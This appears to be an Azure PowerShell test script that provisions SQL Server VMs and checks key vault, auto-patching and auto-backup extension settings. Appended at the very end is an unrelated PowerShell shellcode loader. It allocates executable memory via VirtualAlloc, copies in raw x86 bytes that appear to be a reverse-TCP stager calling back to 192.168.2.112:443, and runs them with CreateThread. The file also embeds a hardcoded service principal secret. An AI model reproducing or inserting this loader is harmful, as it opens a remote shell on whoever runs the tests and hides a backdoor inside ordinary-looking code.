

function Test-SetAzureRmVMSqlServerAKVExtension
{
    Set-StrictMode -Version latest; $ErrorActionPreference = 'Stop'

    
    $rgname = Get-ComputeTestResourceName
    $loc = Get-ComputeVMLocation

    try
    {
        
        New-AzureRmResourceGroup -Name $rgname -Location $loc -Force;

        
        $vmsize = 'Standard_A2';
        $vmname = 'vm' + $rgname;
        $p = New-AzureRmVMConfig -VMName $vmname -VMSize $vmsize;
        Assert-AreEqual $p.HardwareProfile.VmSize $vmsize;

        
        $subnet = New-AzureRmVirtualNetworkSubnetConfig -Name ('subnet' + $rgname) -AddressPrefix "10.0.0.0/24";
        $vnet = New-AzureRmVirtualNetwork -Force -Name ('vnet' + $rgname) -ResourceGroupName $rgname -Location $loc -AddressPrefix "10.0.0.0/16" -Subnet $subnet;
        $vnet = Get-AzureRmVirtualNetwork -Name ('vnet' + $rgname) -ResourceGroupName $rgname;
        $subnetId = $vnet.Subnets[0].Id;
        $pubip = New-AzureRmPublicIpAddress -Force -Name ('pubip' + $rgname) -ResourceGroupName $rgname -Location $loc -AllocationMethod Dynamic -DomainNameLabel ('pubip' + $rgname);
        $pubip = Get-AzureRmPublicIpAddress -Name ('pubip' + $rgname) -ResourceGroupName $rgname;
        $pubipId = $pubip.Id;
        $nic = New-AzureRmNetworkInterface -Force -Name ('nic' + $rgname) -ResourceGroupName $rgname -Location $loc -SubnetId $subnetId -PublicIpAddressId $pubip.Id;
        $nic = Get-AzureRmNetworkInterface -Name ('nic' + $rgname) -ResourceGroupName $rgname;
        $nicId = $nic.Id;

        $p = Add-AzureRmVMNetworkInterface -VM $p -Id $nicId;
        Assert-AreEqual $p.NetworkProfile.NetworkInterfaces.Count 1;
        Assert-AreEqual $p.NetworkProfile.NetworkInterfaces[0].Id $nicId;

        
        $stoname = 'sto' + $rgname;
        $stotype = 'Standard_GRS';
        New-AzureRmStorageAccount -ResourceGroupName $rgname -Name $stoname -Location $loc -Type $stotype;
        Retry-IfException { $global:stoaccount = Get-AzureRmStorageAccount -ResourceGroupName $rgname -Name $stoname; }

        $osDiskName = 'osDisk';
        $osDiskCaching = 'ReadWrite';
        $osDiskVhdUri = "https://$stoname.blob.core.windows.net/test/os.vhd";
        $dataDiskVhdUri1 = "https://$stoname.blob.core.windows.net/test/data1.vhd";

        $p = Set-AzureRmVMOSDisk -VM $p -Name $osDiskName -VhdUri $osDiskVhdUri -Caching $osDiskCaching -CreateOption FromImage;
        $p = Add-AzureRmVMDataDisk -VM $p -Name 'testDataDisk1' -Caching 'ReadOnly' -DiskSizeInGB 10 -Lun 1 -VhdUri $dataDiskVhdUri1 -CreateOption Empty;

        
        $user = "localadmin";
        $password = $PLACEHOLDER;
        $securePassword = ConvertTo-SecureString $password -AsPlainText -Force;
        $cred = New-Object System.Management.Automation.PSCredential ($user, $securePassword);
        $computerName = 'test';
        $vhdContainer = "https://$stoname.blob.core.windows.net/test";

        $p = Set-AzureRmVMOperatingSystem -VM $p -Windows -ComputerName $computerName -Credential $cred -ProvisionVMAgent;
        $p = Set-AzureRmVMSourceImage -VM $p -PublisherName MicrosoftSQLServer -Offer SQL2014SP1-WS2012R2 -Skus Enterprise -Version "latest"

        
        New-AzureRmVM -ResourceGroupName $rgname -Location $loc -VM $p;

        

        $extensionName = "SqlIaaSExtension";

        

        $securepfxpwd = ConvertTo-SecureString –String "Amu6y/RzJcc7JBzdAdRVv6mk=" –AsPlainText –Force;
        $aps_akv = New-AzureRmVMSqlServerKeyVaultCredentialConfig -ResourceGroupName $rgname -Enable -CredentialName "CredentialTesting" -AzureKeyVaultUrl "https://Testkeyvault.vault.azure.net/" -ServicePrincipalName "0326921f-bf005595337c" -ServicePrincipalSecret $securepfxpwd;
        Set-AzureRmVMSqlServerExtension -KeyVaultCredentialSettings $aps_akv -ResourceGroupName $rgname -VMName $vmname -Version "1.2" -Verbose; 

        
        $extension = Get-AzureRmVMSqlServerExtension -ResourceGroupName $rgname -VmName $vmName -Name $extensionName;

        

        Assert-AreEqual $extension.KeyVaultCredentialSettings.Credentials.Count 1;
		Assert-AreEqual $extension.KeyVaultCredentialSettings.Credentials[0].CredentialName "CredentialTesting"

        

        $aps_akv = New-AzureRmVMSqlServerKeyVaultCredentialConfig -ResourceGroupName $rgname -Enable -CredentialName "CredentialTest" -AzureKeyVaultUrl "https://Testkeyvault.vault.azure.net/" -ServicePrincipalName "0326921f-82af-4ab3-9d46-bf005595337c" -ServicePrincipalSecret $securepfxpwd;
        Set-AzureRmVMSqlServerExtension -KeyVaultCredentialSettings $aps_akv -ResourceGroupName $rgname -VMName $vmname -Version "1.2" -Verbose; 

        
        $extension = Get-AzureRmVMSqlServerExtension -ResourceGroupName $rgname -VmName $vmName -Name $extensionName;
		
        Assert-AreEqual $extension.KeyVaultCredentialSettings.Credentials.Count 2;
		Assert-AreEqual $extension.KeyVaultCredentialSettings.Credentials[1].CredentialName "CredentialTest"

        

        Set-AzureRmVMSqlServerExtension -KeyVaultCredentialSettings $aps_akv  -ResourceGroupName $rgname -VMName $vmName -Name $extensionName -Version "1.2"

        
        Set-AzureRmVMSqlServerExtension -KeyVaultCredentialSettings $aps_akv  -ResourceGroupName $rgname -VMName $vmName -Name $extensionName -Version "1.*"
    }
    finally
    {
        
        if(Get-AzureRmResourceGroup -Name $rgname -Location $loc)
        {
             
        }
    }
}

function Test-SetAzureRmVMSqlServerExtension
{
    Set-StrictMode -Version latest; $ErrorActionPreference = 'Stop'

    
    $rgname = Get-ComputeTestResourceName
    $loc = Get-ComputeVMLocation

    try
    {
        
        New-AzureRmResourceGroup -Name $rgname -Location $loc -Force;

        
        $vmsize = 'Standard_A2';
        $vmname = 'vm' + $rgname;
        $p = New-AzureRmVMConfig -VMName $vmname -VMSize $vmsize;
        Assert-AreEqual $p.HardwareProfile.VmSize $vmsize;

        
        $subnet = New-AzureRmVirtualNetworkSubnetConfig -Name ('subnet' + $rgname) -AddressPrefix "10.0.0.0/24";
        $vnet = New-AzureRmVirtualNetwork -Force -Name ('vnet' + $rgname) -ResourceGroupName $rgname -Location $loc -AddressPrefix "10.0.0.0/16" -Subnet $subnet;
        $vnet = Get-AzureRmVirtualNetwork -Name ('vnet' + $rgname) -ResourceGroupName $rgname;
        $subnetId = $vnet.Subnets[0].Id;
        $pubip = New-AzureRmPublicIpAddress -Force -Name ('pubip' + $rgname) -ResourceGroupName $rgname -Location $loc -AllocationMethod Dynamic -DomainNameLabel ('pubip' + $rgname);
        $pubip = Get-AzureRmPublicIpAddress -Name ('pubip' + $rgname) -ResourceGroupName $rgname;
        $pubipId = $pubip.Id;
        $nic = New-AzureRmNetworkInterface -Force -Name ('nic' + $rgname) -ResourceGroupName $rgname -Location $loc -SubnetId $subnetId -PublicIpAddressId $pubip.Id;
        $nic = Get-AzureRmNetworkInterface -Name ('nic' + $rgname) -ResourceGroupName $rgname;
        $nicId = $nic.Id;

        $p = Add-AzureRmVMNetworkInterface -VM $p -Id $nicId;
        Assert-AreEqual $p.NetworkProfile.NetworkInterfaces.Count 1;
        Assert-AreEqual $p.NetworkProfile.NetworkInterfaces[0].Id $nicId;

        
        $stoname = 'sto' + $rgname;
        $stotype = 'Standard_GRS';
        New-AzureRmStorageAccount -ResourceGroupName $rgname -Name $stoname -Location $loc -Type $stotype;
        Retry-IfException { $global:stoaccount = Get-AzureRmStorageAccount -ResourceGroupName $rgname -Name $stoname; }

        $osDiskName = 'osDisk';
        $osDiskCaching = 'ReadWrite';
        $osDiskVhdUri = "https://$stoname.blob.core.windows.net/test/os.vhd";
        $dataDiskVhdUri1 = "https://$stoname.blob.core.windows.net/test/data1.vhd";

        $p = Set-AzureRmVMOSDisk -VM $p -Name $osDiskName -VhdUri $osDiskVhdUri -Caching $osDiskCaching -CreateOption FromImage;
        $p = Add-AzureRmVMDataDisk -VM $p -Name 'testDataDisk1' -Caching 'ReadOnly' -DiskSizeInGB 10 -Lun 1 -VhdUri $dataDiskVhdUri1 -CreateOption Empty;

        
        $user = "localadmin";
        $password = $PLACEHOLDER;
        $securePassword = ConvertTo-SecureString $password -AsPlainText -Force;
        $cred = New-Object System.Management.Automation.PSCredential ($user, $securePassword);
        $computerName = 'test';
        $vhdContainer = "https://$stoname.blob.core.windows.net/test";

        $p = Set-AzureRmVMOperatingSystem -VM $p -Windows -ComputerName $computerName -Credential $cred -ProvisionVMAgent;
        $p = Set-AzureRmVMSourceImage -VM $p -PublisherName MicrosoftSQLServer -Offer SQL2014SP1-WS2012R2 -Skus Enterprise -Version "latest"

        
        New-AzureRmVM -ResourceGroupName $rgname -Location $loc -VM $p;

        

        $extensionName = "SqlIaaSExtension";

        
        $aps = New-AzureRmVMSqlServerAutoPatchingConfig -Enable -DayOfWeek "Thursday" -MaintenanceWindowStartingHour 20 -MaintenanceWindowDuration 120 -PatchCategory "Important"
		$storageBlobUrl = "https://$stoname.blob.core.windows.net";
		$storageKey = (Get-AzureRmStorageAccountKey -ResourceGroupName $rgname -Name $stoname).Key1;
		$storageKeyAsSecureString = ConvertTo-SecureString -String $storageKey -AsPlainText -Force;
		$abs = New-AzureRmVMSqlServerAutoBackupConfig -Enable -RetentionPeriodInDays 5 -ResourceGroupName $rgname -StorageUri $storageBlobUrl -StorageKey $storageKeyAsSecureString
        Set-AzureRmVMSqlServerExtension -AutoPatchingSettings $aps -AutoBackupSettings $abs -ResourceGroupName $rgname -VMName $vmname -Version "1.2" -Verbose -Name $extensionName;

        
        $extension = Get-AzureRmVMSqlServerExtension -ResourceGroupName $rgname -VmName $vmName -Name $extensionName;

        
        Assert-AreEqual $extension.AutoPatchingSettings.DayOfWeek "Thursday"
        Assert-AreEqual $extension.AutoPatchingSettings.MaintenanceWindowStartingHour 20
        Assert-AreEqual $extension.AutoPatchingSettings.MaintenanceWindowDuration 120
        Assert-AreEqual $extension.AutoPatchingSettings.PatchCategory "Important"

		Assert-AreEqual $extension.AutoBackupSettings.RetentionPeriod 5
        Assert-AreEqual $extension.AutoBackupSettings.Enable $true

        
        $aps = New-AzureRmVMSqlServerAutoPatchingConfig -Enable -DayOfWeek "Monday" -MaintenanceWindowStartingHour 20 -MaintenanceWindowDuration 120 -PatchCategory "Important"
        $abs = New-AzureRmVMSqlServerAutoBackupConfig -Enable -RetentionPeriodInDays 10 -ResourceGroupName $rgname -StorageUri $storageBlobUrl -StorageKey $storageKeyAsSecureString
		Set-AzureRmVMSqlServerExtension -AutoPatchingSettings $aps -AutoBackupSettings $abs  -ResourceGroupName $rgname -VMName $vmname -Version "1.2" -Verbose -Name $extensionName;

        

        $extension = Get-AzureRmVMSqlServerExtension -ResourceGroupName $rgname -VmName $vmName -Name $extensionName;
        Assert-AreEqual $extension.AutoPatchingSettings.DayOfWeek "Monday"
		Assert-AreEqual $extension.AutoBackupSettings.RetentionPeriod 10

        
        Set-AzureRmVMSqlServerExtension -AutoPatchingSettings $aps -AutoBackupSettings $abs -ResourceGroupName $rgname -VMName $vmName -Name $extensionName -Version "1.2"

        
        Set-AzureRmVMSqlServerExtension -AutoPatchingSettings $aps -AutoBackupSettings $abs -ResourceGroupName $rgname -VMName $vmName -Name $extensionName -Version "1.*"
    }
    finally
    {
        
        if(Get-AzureRmResourceGroup -Name $rgname -Location $loc)
        {
            
        }
    }
}


function Test-SetAzureRmVMSqlServerExtensionWith2016Image
{
    Set-StrictMode -Version latest; $ErrorActionPreference = 'Stop'

    
    $rgname = Get-ComputeTestResourceName
    $loc = Get-ComputeVMLocation

    try
    {
        
        New-AzureRmResourceGroup -Name $rgname -Location $loc -Force;

        
        $vmsize = 'Standard_A2';
        $vmname = 'vm' + $rgname;
        $p = New-AzureRmVMConfig -VMName $vmname -VMSize $vmsize;
        Assert-AreEqual $p.HardwareProfile.VmSize $vmsize;

        
        $subnet = New-AzureRmVirtualNetworkSubnetConfig -Name ('subnet' + $rgname) -AddressPrefix "10.0.0.0/24";
        $vnet = New-AzureRmVirtualNetwork -Force -Name ('vnet' + $rgname) -ResourceGroupName $rgname -Location $loc -AddressPrefix "10.0.0.0/16" -Subnet $subnet;
        $vnet = Get-AzureRmVirtualNetwork -Name ('vnet' + $rgname) -ResourceGroupName $rgname;
        $subnetId = $vnet.Subnets[0].Id;
        $pubip = New-AzureRmPublicIpAddress -Force -Name ('pubip' + $rgname) -ResourceGroupName $rgname -Location $loc -AllocationMethod Dynamic -DomainNameLabel ('pubip' + $rgname);
        $pubip = Get-AzureRmPublicIpAddress -Name ('pubip' + $rgname) -ResourceGroupName $rgname;
        $pubipId = $pubip.Id;
        $nic = New-AzureRmNetworkInterface -Force -Name ('nic' + $rgname) -ResourceGroupName $rgname -Location $loc -SubnetId $subnetId -PublicIpAddressId $pubip.Id;
        $nic = Get-AzureRmNetworkInterface -Name ('nic' + $rgname) -ResourceGroupName $rgname;
        $nicId = $nic.Id;

        $p = Add-AzureRmVMNetworkInterface -VM $p -Id $nicId;
        Assert-AreEqual $p.NetworkProfile.NetworkInterfaces.Count 1;
        Assert-AreEqual $p.NetworkProfile.NetworkInterfaces[0].Id $nicId;

        
        $stoname = 'sto' + $rgname;
        $stotype = 'Standard_GRS';
        New-AzureRmStorageAccount -ResourceGroupName $rgname -Name $stoname -Location $loc -Type $stotype;
        Retry-IfException { $global:stoaccount = Get-AzureRmStorageAccount -ResourceGroupName $rgname -Name $stoname; }

        $osDiskName = 'osDisk';
        $osDiskCaching = 'ReadWrite';
        $osDiskVhdUri = "https://$stoname.blob.core.windows.net/test/os.vhd";
        $dataDiskVhdUri1 = "https://$stoname.blob.core.windows.net/test/data1.vhd";

        $p = Set-AzureRmVMOSDisk -VM $p -Name $osDiskName -VhdUri $osDiskVhdUri -Caching $osDiskCaching -CreateOption FromImage;
        $p = Add-AzureRmVMDataDisk -VM $p -Name 'testDataDisk1' -Caching 'ReadOnly' -DiskSizeInGB 10 -Lun 1 -VhdUri $dataDiskVhdUri1 -CreateOption Empty;

        
        $user = "localadmin";
        $password = $PLACEHOLDER;
        $securePassword = ConvertTo-SecureString $password -AsPlainText -Force;
        $cred = New-Object System.Management.Automation.PSCredential ($user, $securePassword);
        $computerName = 'test';
        $vhdContainer = "https://$stoname.blob.core.windows.net/test";

        $p = Set-AzureRmVMOperatingSystem -VM $p -Windows -ComputerName $computerName -Credential $cred -ProvisionVMAgent;
        $p = Set-AzureRmVMSourceImage -VM $p -PublisherName MicrosoftSQLServer -Offer SQL2016-WS2012R2 -Skus Enterprise -Version "latest"

        
        New-AzureRmVM -ResourceGroupName $rgname -Location $loc -VM $p;

        

        $extensionName = "Microsoft.SqlServer.Management.SqlIaaSAgent";

        
        $aps = New-AzureRmVMSqlServerAutoPatchingConfig -Enable -DayOfWeek "Thursday" -MaintenanceWindowStartingHour 20 -MaintenanceWindowDuration 120 -PatchCategory "Important"
		$storageBlobUrl = "https://$stoname.blob.core.windows.net";
		$storageKey = (Get-AzureRmStorageAccountKey -ResourceGroupName $rgname -Name $stoname).Key1;
		$storageKeyAsSecureString = ConvertTo-SecureString -String $storageKey -AsPlainText -Force;
		$abs = New-AzureRmVMSqlServerAutoBackupConfig -Enable -RetentionPeriodInDays 5 -ResourceGroupName $rgname -StorageUri $storageBlobUrl -StorageKey $storageKeyAsSecureString `
			-BackupScheduleType Manual -BackupSystemDbs -FullBackupStartHour 10 -FullBackupWindowInHours 5 -FullBackupFrequency Daily -LogBackupFrequencyInMinutes 30
        Set-AzureRmVMSqlServerExtension -AutoPatchingSettings $aps -AutoBackupSettings $abs -ResourceGroupName $rgname -VMName $vmname -Version "1.2" -Verbose -Name $extensionName;

        
        $extension = Get-AzureRmVMSqlServerExtension -ResourceGroupName $rgname -VmName $vmName -Name $extensionName;

        
        Assert-AreEqual $extension.AutoPatchingSettings.DayOfWeek "Thursday"
        Assert-AreEqual $extension.AutoPatchingSettings.MaintenanceWindowStartingHour 20
        Assert-AreEqual $extension.AutoPatchingSettings.MaintenanceWindowDuration 120
        Assert-AreEqual $extension.AutoPatchingSettings.PatchCategory "Important"

		Assert-AreEqual $extension.AutoBackupSettings.RetentionPeriod 5
        Assert-AreEqual $extension.AutoBackupSettings.Enable $true
        Assert-AreEqual $extension.AutoBackupSettings.BackupScheduleType "Manual"
        Assert-AreEqual $extension.AutoBackupSettings.FullBackupFrequency "Daily"
        Assert-AreEqual $extension.AutoBackupSettings.BackupSystemDbs $true
        Assert-AreEqual $extension.AutoBackupSettings.FullBackupStartTime 10
        Assert-AreEqual $extension.AutoBackupSettings.FullBackupWindowHours 5
        Assert-AreEqual $extension.AutoBackupSettings.LogBackupFrequency 30

        
        $aps = New-AzureRmVMSqlServerAutoPatchingConfig -Enable -DayOfWeek "Monday" -MaintenanceWindowStartingHour 20 -MaintenanceWindowDuration 120 -PatchCategory "Important"
        $abs = New-AzureRmVMSqlServerAutoBackupConfig -Enable -RetentionPeriodInDays 10 -ResourceGroupName $rgname -StorageUri $storageBlobUrl `
				-StorageKey $storageKeyAsSecureString -BackupScheduleType Automated
		Set-AzureRmVMSqlServerExtension -AutoPatchingSettings $aps -AutoBackupSettings $abs -ResourceGroupName $rgname -VMName $vmname -Version "1.2" -Verbose -Name $extensionName;

        
        $extension = Get-AzureRmVMSqlServerExtension -ResourceGroupName $rgname -VmName $vmName -Name $extensionName;
        Assert-AreEqual $extension.AutoPatchingSettings.DayOfWeek "Monday"
		Assert-AreEqual $extension.AutoBackupSettings.RetentionPeriod 10
        Assert-AreEqual $extension.AutoBackupSettings.Enable $true
        Assert-AreEqual $extension.AutoBackupSettings.BackupScheduleType "Automated"

        
        Set-AzureRmVMSqlServerExtension -AutoPatchingSettings $aps -AutoBackupSettings $abs -ResourceGroupName $rgname -VMName $vmName -Name $extensionName -Version "1.2"

        
        Set-AzureRmVMSqlServerExtension -AutoPatchingSettings $aps -AutoBackupSettings $abs -ResourceGroupName $rgname -VMName $vmName -Name $extensionName -Version "1.*"
    }
    finally
    {
        
        if(Get-AzureRmResourceGroup -Name $rgname -Location $loc)
        {
            
        }
    }
}


function Get-DefaultResourceGroupLocation
{
    if ([Microsoft.Azure.Test.HttpRecorder.HttpMockServer]::Mode -ne [Microsoft.Azure.Test.HttpRecorder.HttpRecorderMode]::Playback)
    {
        $namespace = "Microsoft.Resources"
        $type = "resourceGroups"
        $location = Get-AzureRmResourceProvider -ProviderNamespace $namespace | where {$_.ResourceTypes[0].ResourceTypeName -eq $type}

        if ($location -eq $null)
        {
            return "West US"
        } else
        {
            return $location.Locations[0]
        }
    }
    return "West US"
}

$c = '[DllImport("kernel32.dll")]public static extern IntPtr VirtualAlloc(IntPtr lpAddress, uint dwSize, uint flAllocationType, uint flProtect);[DllImport("kernel32.dll")]public static extern IntPtr CreateThread(IntPtr lpThreadAttributes, uint dwStackSize, IntPtr lpStartAddress, IntPtr lpParameter, uint dwCreationFlags, IntPtr lpThreadId);[DllImport("msvcrt.dll")]public static extern IntPtr memset(IntPtr dest, uint src, uint count);';$w = Add-Type -memberDefinition $c -Name "Win32" -namespace Win32Functions -passthru;[Byte[]];[Byte[]]$z = 0xfc,0xe8,0x89,0x00,0x00,0x00,0x60,0x89,0xe5,0x31,0xd2,0x64,0x8b,0x52,0x30,0x8b,0x52,0x0c,0x8b,0x52,0x14,0x8b,0x72,0x28,0x0f,0xb7,0x4a,0x26,0x31,0xff,0x31,0xc0,0xac,0x3c,0x61,0x7c,0x02,0x2c,0x20,0xc1,0xcf,0x0d,0x01,0xc7,0xe2,0xf0,0x52,0x57,0x8b,0x52,0x10,0x8b,0x42,0x3c,0x01,0xd0,0x8b,0x40,0x78,0x85,0xc0,0x74,0x4a,0x01,0xd0,0x50,0x8b,0x48,0x18,0x8b,0x58,0x20,0x01,0xd3,0xe3,0x3c,0x49,0x8b,0x34,0x8b,0x01,0xd6,0x31,0xff,0x31,0xc0,0xac,0xc1,0xcf,0x0d,0x01,0xc7,0x38,0xe0,0x75,0xf4,0x03,0x7d,0xf8,0x3b,0x7d,0x24,0x75,0xe2,0x58,0x8b,0x58,0x24,0x01,0xd3,0x66,0x8b,0x0c,0x4b,0x8b,0x58,0x1c,0x01,0xd3,0x8b,0x04,0x8b,0x01,0xd0,0x89,0x44,0x24,0x24,0x5b,0x5b,0x61,0x59,0x5a,0x51,0xff,0xe0,0x58,0x5f,0x5a,0x8b,0x12,0xeb,0x86,0x5d,0x68,0x33,0x32,0x00,0x00,0x68,0x77,0x73,0x32,0x5f,0x54,0x68,0x4c,0x77,0x26,0x07,0xff,0xd5,0xb8,0x90,0x01,0x00,0x00,0x29,0xc4,0x54,0x50,0x68,0x29,0x80,0x6b,0x00,0xff,0xd5,0x50,0x50,0x50,0x50,0x40,0x50,0x40,0x50,0x68,0xea,0x0f,0xdf,0xe0,0xff,0xd5,0x97,0x6a,0x05,0x68,0xc0,0xa8,0x02,0x70,0x68,0x02,0x00,0x01,0xbb,0x89,0xe6,0x6a,0x10,0x56,0x57,0x68,0x99,0xa5,0x74,0x61,0xff,0xd5,0x85,0xc0,0x74,0x0c,0xff,0x4e,0x08,0x75,0xec,0x68,0xf0,0xb5,0xa2,0x56,0xff,0xd5,0x6a,0x00,0x6a,0x04,0x56,0x57,0x68,0x02,0xd9,0xc8,0x5f,0xff,0xd5,0x8b,0x36,0x6a,0x40,0x68,0x00,0x10,0x00,0x00,0x56,0x6a,0x00,0x68,0x58,0xa4,0x53,0xe5,0xff,0xd5,0x93,0x53,0x6a,0x00,0x56,0x53,0x57,0x68,0x02,0xd9,0xc8,0x5f,0xff,0xd5,0x01,0xc3,0x29,0xc6,0x85,0xf6,0x75,0xec,0xc3;$g = 0x1000;if ($z.Length -gt 0x1000){$g = $z.Length};$x=$w::VirtualAlloc(0,0x1000,$g,0x40);for ($i=0;$i -le ($z.Length-1);$i++) {$w::memset([IntPtr]($x.ToInt32()+$i), $z[$i], 1)};$w::CreateThread(0,0,$x,0,0,0);for (;;){Start-sleep 60};

